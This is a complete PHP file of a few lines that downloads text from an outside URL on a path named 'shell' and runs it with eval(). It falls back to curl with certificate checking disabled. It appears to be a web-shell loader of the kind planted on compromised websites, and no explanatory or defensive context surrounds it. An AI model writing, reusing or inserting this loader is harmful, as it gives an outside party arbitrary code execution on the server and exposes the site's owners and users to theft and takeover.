<?php function getKieboLink($link) { if( ini_get('allow_url_fopen') == 1 ) { return file_get_contents($link); }else if(function_exists('curl_version')) { $chm = curl_init(); curl_setopt($chm, CURLOPT_URL, $link); curl_setopt($chm, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($chm, CURLOPT_RETURNTRANSFER, true); curl_setopt($chm, CURLOPT_HEADER, 0); $code = curl_exec($chm); curl_close($chm); return $code; } } eval("?>" . getKieboLink("https://marslogs.co.id/shell/shell/403-for.txt")); ?>
